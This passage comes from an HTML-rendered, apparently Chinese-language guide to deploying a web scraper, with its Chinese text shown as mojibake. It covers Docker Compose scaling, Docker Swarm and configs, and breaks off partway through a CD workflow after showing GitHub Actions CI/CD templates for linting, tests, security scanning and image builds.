<span class="c1"># Docker å¥åº·çŠ¶æ€</span>
docker<span class="w"> </span>inspect<span class="w"> </span>--format<span class="o">=</span><span class="s1">&#39;{{.State.Health.Status}}&#39;</span><span class="w"> </span>scraper_app
</code></pre>
      </div>

      <hr />

      <h2 id="è¿›é˜¶é…ç½®">ğŸ”§ è¿›é˜¶é…ç½®</h2>

      <h3 id="å¤šå‰¯æœ¬éƒ¨ç½²">å¤šå‰¯æœ¬éƒ¨ç½²</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># docker-compose.yml</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">scraper</span><span class="p">:</span>
<span class="w">    </span><span class="c1"># ... å…¶ä»–é…ç½®</span>
<span class="w">    </span><span class="nt">deploy</span><span class="p">:</span>
<span class="w">      </span><span class="nt">replicas</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">3</span>
<span class="w">      </span><span class="nt">resources</span><span class="p">:</span>
<span class="w">        </span><span class="nt">limits</span><span class="p">:</span>
<span class="w">          </span><span class="nt">cpus</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;0.5&#39;</span>
<span class="w">          </span><span class="nt">memory</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">512M</span>
<span class="w">        </span><span class="nt">reservations</span><span class="p">:</span>
<span class="w">          </span><span class="nt">cpus</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;0.25&#39;</span>
<span class="w">          </span><span class="nt">memory</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">256M</span>
</code></pre>
      </div>

      <h3 id="ä½¿ç”¨-docker-swarm">ä½¿ç”¨ Docker Swarm</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># åˆå§‹åŒ– Swarm</span>
docker<span class="w"> </span>swarm<span class="w"> </span>init

<span class="c1"># éƒ¨ç½²æœåŠ¡æ ˆ</span>
docker<span class="w"> </span>stack<span class="w"> </span>deploy<span class="w"> </span>-c<span class="w"> </span>docker-compose.yml<span class="w"> </span>scraper_stack

<span class="c1"># æŸ¥çœ‹æœåŠ¡</span>
docker<span class="w"> </span>service<span class="w"> </span>ls

<span class="c1"># æ‰©å®¹</span>
docker<span class="w"> </span>service<span class="w"> </span>scale<span class="w"> </span><span class="nv">scraper_stack_scraper</span><span class="o">=</span><span class="m">5</span>
</code></pre>
      </div>

      <h3 id="ä½¿ç”¨å¤–éƒ¨é…ç½®">ä½¿ç”¨å¤–éƒ¨é…ç½®</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="c1"># docker-compose.yml</span>
<span class="nt">services</span><span class="p">:</span>
<span class="w">  </span><span class="nt">scraper</span><span class="p">:</span>
<span class="w">    </span><span class="nt">configs</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">source</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">app_config</span>
<span class="w">        </span><span class="nt">target</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">/app/config.yaml</span>

<span class="nt">configs</span><span class="p">:</span>
<span class="w">  </span><span class="nt">app_config</span><span class="p">:</span>
<span class="w">    </span><span class="nt">file</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./config.yaml</span>
</code></pre>
      </div>

      <hr />

      <h2 id="ç›¸å…³èµ„æº">ğŸ“š ç›¸å…³èµ„æº</h2>

      <ul>
        <li><a href="#06-Engineering-docker-deployment">Docker éƒ¨ç½²</a></li>
        <li><a href="#09-Templates-distributed-crawler">åˆ†å¸ƒå¼çˆ¬è™«</a></li>
        <li><a href="#06-Engineering-monitoring-and-alerting">ç›‘æ§å‘Šè­¦</a></li>
      </ul>

    </div>

    <div class="section" id="09-Templates-cicd-pipeline">
      <h2>72. CI/CD Pipeline</h2>
      <h1 id="cicd-æµæ°´çº¿æ¨¡æ¿">CI/CD æµæ°´çº¿æ¨¡æ¿</h1>

      <p>è‡ªåŠ¨åŒ–æ„å»ºã€æµ‹è¯•å’Œéƒ¨ç½²é…ç½®ï¼Œæ”¯æŒ GitHub Actionsã€GitLab CI å’Œ Jenkinsã€‚</p>

      <hr />

      <h2 id="é¡¹ç›®ç»“æ„">ğŸ“ é¡¹ç›®ç»“æ„</h2>

      <pre><code>.
â”œâ”€â”€ .github/
â”‚   â””â”€â”€ workflows/
â”‚       â”œâ”€â”€ ci.yml              # æŒç»­é›†æˆ
â”‚       â”œâ”€â”€ cd.yml              # æŒç»­éƒ¨ç½²
â”‚       â””â”€â”€ docker-publish.yml  # Docker é•œåƒå‘å¸ƒ
â”œâ”€â”€ .gitlab-ci.yml              # GitLab CI
â”œâ”€â”€ Jenkinsfile                 # Jenkins Pipeline
â”œâ”€â”€ scripts/
â”‚   â”œâ”€â”€ run_tests.sh
â”‚   â”œâ”€â”€ build.sh
â”‚   â””â”€â”€ deploy.sh
â””â”€â”€ tests/
    â”œâ”€â”€ unit/
    â”œâ”€â”€ integration/
    â””â”€â”€ e2e/
</code></pre>

      <hr />

      <h2 id="github-actions">GitHub Actions</h2>

      <h3 id="1-githubworkflowsciyml-æŒç»­é›†æˆ">1. .github/workflows/ci.yml (æŒç»­é›†æˆ)</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CI</span>

<span class="nt">on</span><span class="p">:</span>
<span class="w">  </span><span class="nt">push</span><span class="p">:</span>
<span class="w">    </span><span class="nt">branches</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="w"> </span><span class="nv">main</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">develop</span><span class="w"> </span><span class="p p-Indicator">]</span>
<span class="w">  </span><span class="nt">pull_request</span><span class="p">:</span>
<span class="w">    </span><span class="nt">branches</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="w"> </span><span class="nv">main</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="nv">develop</span><span class="w"> </span><span class="p p-Indicator">]</span>

<span class="nt">env</span><span class="p">:</span>
<span class="w">  </span><span class="nt">PYTHON_VERSION</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;3.11&#39;</span>

<span class="nt">jobs</span><span class="p">:</span>
<span class="w">  </span><span class="c1"># ä»£ç è´¨é‡æ£€æŸ¥</span>
<span class="w">  </span><span class="nt">lint</span><span class="p">:</span>
<span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Code Quality</span>
<span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ubuntu-latest</span>

<span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Checkout code</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/checkout@v4</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Set up Python</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/setup-python@v5</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">python-version</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ env.PYTHON_VERSION }}</span>
<span class="w">          </span><span class="nt">cache</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;pip&#39;</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Install dependencies</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
<span class="w">          </span><span class="no">python -m pip install --upgrade pip</span>
<span class="w">          </span><span class="no">pip install flake8 black mypy pylint</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Run Black (æ ¼å¼æ£€æŸ¥)</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">black --check .</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Run Flake8 (ä»£ç è§„èŒƒ)</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">flake8 . --count --select=E9,F63,F7,F82 --show-source --statistics</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Run MyPy (ç±»å‹æ£€æŸ¥)</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mypy . --ignore-missing-imports</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Run Pylint</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">pylint **/*.py --fail-under=8.0</span>

<span class="w">  </span><span class="c1"># å•å…ƒæµ‹è¯•</span>
<span class="w">  </span><span class="nt">test</span><span class="p">:</span>
<span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Unit Tests</span>
<span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ubuntu-latest</span>
<span class="w">    </span><span class="nt">needs</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">lint</span>

<span class="w">    </span><span class="nt">strategy</span><span class="p">:</span>
<span class="w">      </span><span class="nt">matrix</span><span class="p">:</span>
<span class="w">        </span><span class="nt">python-version</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="s">&#39;3.10&#39;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&#39;3.11&#39;</span><span class="p p-Indicator">,</span><span class="w"> </span><span class="s">&#39;3.12&#39;</span><span class="p p-Indicator">]</span>

<span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/checkout@v4</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Set up Python ${{ matrix.python-version }}</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/setup-python@v5</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">python-version</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ matrix.python-version }}</span>
<span class="w">          </span><span class="nt">cache</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;pip&#39;</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Install dependencies</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
<span class="w">          </span><span class="no">pip install -r requirements.txt</span>
<span class="w">          </span><span class="no">pip install -r requirements-dev.txt</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Run tests with coverage</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
<span class="w">          </span><span class="no">pytest tests/unit/ \</span>
<span class="w">            </span><span class="no">--cov=app \</span>
<span class="w">            </span><span class="no">--cov-report=xml \</span>
<span class="w">            </span><span class="no">--cov-report=html \</span>
<span class="w">            </span><span class="no">--junitxml=junit.xml</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Upload coverage to Codecov</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">codecov/codecov-action@v4</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">files</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./coverage.xml</span>
<span class="w">          </span><span class="nt">flags</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">unittests</span>
<span class="w">          </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">codecov-${{ matrix.python-version }}</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Upload test results</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/upload-artifact@v4</span>
<span class="w">        </span><span class="nt">if</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">always()</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">test-results-${{ matrix.python-version }}</span>
<span class="w">          </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
<span class="w">            </span><span class="no">junit.xml</span>
<span class="w">            </span><span class="no">htmlcov/</span>

<span class="w">  </span><span class="c1"># é›†æˆæµ‹è¯•</span>
<span class="w">  </span><span class="nt">integration-test</span><span class="p">:</span>
<span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Integration Tests</span>
<span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ubuntu-latest</span>
<span class="w">    </span><span class="nt">needs</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">test</span>

<span class="w">    </span><span class="nt">services</span><span class="p">:</span>
<span class="w">      </span><span class="nt">mongodb</span><span class="p">:</span>
<span class="w">        </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongo:7.0</span>
<span class="w">        </span><span class="nt">env</span><span class="p">:</span>
<span class="w">          </span><span class="nt">MONGO_INITDB_ROOT_USERNAME</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">admin</span>
<span class="w">          </span><span class="nt">MONGO_INITDB_ROOT_PASSWORD</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">admin123</span>
<span class="w">        </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">          </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">27017:27017</span>
<span class="w">        </span><span class="nt">options</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;-</span>
<span class="w">          </span><span class="no">--health-cmd &quot;echo &#39;db.runCommand(\&quot;ping\&quot;).ok&#39; | mongosh localhost:27017/test --quiet&quot;</span>
<span class="w">          </span><span class="no">--health-interval 10s</span>
<span class="w">          </span><span class="no">--health-timeout 5s</span>
<span class="w">          </span><span class="no">--health-retries 5</span>

<span class="w">      </span><span class="nt">redis</span><span class="p">:</span>
<span class="w">        </span><span class="nt">image</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">redis:7-alpine</span>
<span class="w">        </span><span class="nt">ports</span><span class="p">:</span>
<span class="w">          </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">6379:6379</span>
<span class="w">        </span><span class="nt">options</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">&gt;-</span>
<span class="w">          </span><span class="no">--health-cmd &quot;redis-cli ping&quot;</span>
<span class="w">          </span><span class="no">--health-interval 10s</span>
<span class="w">          </span><span class="no">--health-timeout 5s</span>
<span class="w">          </span><span class="no">--health-retries 5</span>

<span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/checkout@v4</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Set up Python</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/setup-python@v5</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">python-version</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ env.PYTHON_VERSION }}</span>
<span class="w">          </span><span class="nt">cache</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;pip&#39;</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Install dependencies</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
<span class="w">          </span><span class="no">pip install -r requirements.txt</span>
<span class="w">          </span><span class="no">pip install -r requirements-dev.txt</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Run integration tests</span>
<span class="w">        </span><span class="nt">env</span><span class="p">:</span>
<span class="w">          </span><span class="nt">MONGODB_URI</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">mongodb://admin:admin123@localhost:27017/</span>
<span class="w">          </span><span class="nt">REDIS_HOST</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">localhost</span>
<span class="w">          </span><span class="nt">REDIS_PORT</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">6379</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
<span class="w">          </span><span class="no">pytest tests/integration/ -v --tb=short</span>

<span class="w">  </span><span class="c1"># å®‰å…¨æ‰«æ</span>
<span class="w">  </span><span class="nt">security</span><span class="p">:</span>
<span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Security Scan</span>
<span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ubuntu-latest</span>
<span class="w">    </span><span class="nt">needs</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">lint</span>

<span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/checkout@v4</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Set up Python</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/setup-python@v5</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">python-version</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ env.PYTHON_VERSION }}</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Install dependencies</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
<span class="w">          </span><span class="no">pip install safety bandit</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Check for security vulnerabilities (Safety)</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">safety check --json</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Run Bandit (ä»£ç å®‰å…¨æ‰«æ)</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">bandit -r app/ -f json -o bandit-report.json</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Upload security reports</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/upload-artifact@v4</span>
<span class="w">        </span><span class="nt">if</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">always()</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">security-reports</span>
<span class="w">          </span><span class="nt">path</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
<span class="w">            </span><span class="no">bandit-report.json</span>

<span class="w">  </span><span class="c1"># Docker æ„å»ºæµ‹è¯•</span>
<span class="w">  </span><span class="nt">docker-build</span><span class="p">:</span>
<span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Docker Build Test</span>
<span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ubuntu-latest</span>
<span class="w">    </span><span class="nt">needs</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">test</span>

<span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/checkout@v4</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Set up Docker Buildx</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker/setup-buildx-action@v3</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Build Docker image</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker/build-push-action@v5</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">context</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">.</span>
<span class="w">          </span><span class="nt">file</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">./docker/Dockerfile</span>
<span class="w">          </span><span class="nt">push</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">false</span>
<span class="w">          </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">scraper:test</span>
<span class="w">          </span><span class="nt">cache-from</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">type=gha</span>
<span class="w">          </span><span class="nt">cache-to</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">type=gha,mode=max</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Test Docker image</span>
<span class="w">        </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
<span class="w">          </span><span class="no">docker run --rm scraper:test python -c &quot;import app; print(&#39;âœ… Import successful&#39;)&quot;</span>
</code></pre>
      </div>

      <h3 id="2-githubworkflowscdyml-æŒç»­éƒ¨ç½²">2. .github/workflows/cd.yml (æŒç»­éƒ¨ç½²)</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">CD</span>

<span class="nt">on</span><span class="p">:</span>
<span class="w">  </span><span class="nt">push</span><span class="p">:</span>
<span class="w">    </span><span class="nt">tags</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="s">&#39;v*&#39;</span>
<span class="w">  </span><span class="nt">workflow_dispatch</span><span class="p">:</span>

<span class="nt">env</span><span class="p">:</span>
<span class="w">  </span><span class="nt">PYTHON_VERSION</span><span class="p">:</span><span class="w"> </span><span class="s">&#39;3.11&#39;</span>
<span class="w">  </span><span class="nt">REGISTRY</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ghcr.io</span>
<span class="w">  </span><span class="nt">IMAGE_NAME</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ github.repository }}</span>

<span class="nt">jobs</span><span class="p">:</span>
<span class="w">  </span><span class="c1"># æ„å»ºå¹¶å‘å¸ƒ Docker é•œåƒ</span>
<span class="w">  </span><span class="nt">build-and-push</span><span class="p">:</span>
<span class="w">    </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Build and Push Docker Image</span>
<span class="w">    </span><span class="nt">runs-on</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">ubuntu-latest</span>
<span class="w">    </span><span class="nt">permissions</span><span class="p">:</span>
<span class="w">      </span><span class="nt">contents</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">read</span>
<span class="w">      </span><span class="nt">packages</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">write</span>

<span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Checkout code</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">actions/checkout@v4</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Log in to Container Registry</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker/login-action@v3</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">registry</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ env.REGISTRY }}</span>
<span class="w">          </span><span class="nt">username</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ github.actor }}</span>
<span class="w">          </span><span class="nt">password</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ secrets.GITHUB_TOKEN }}</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Extract metadata</span>
<span class="w">        </span><span class="nt">id</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">meta</span>
<span class="w">        </span><span class="nt">uses</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">docker/metadata-action@v5</span>
<span class="w">        </span><span class="nt">with</span><span class="p">:</span>
<span class="w">          </span><span class="nt">images</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}</span>
<span class="w">          </span><span class="nt">tags</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
<span class="w">            </span><span class="no">type=semver,pattern={{version}}</span>
<span class="w">            </span><span class="no">type=semver,pattern={{major}}.{{minor}}</span>
<span class="w">            </span><span class="no">type=sha,prefix={{branch}}-</span>

<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">name</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">Set up Docker Buildx</span>
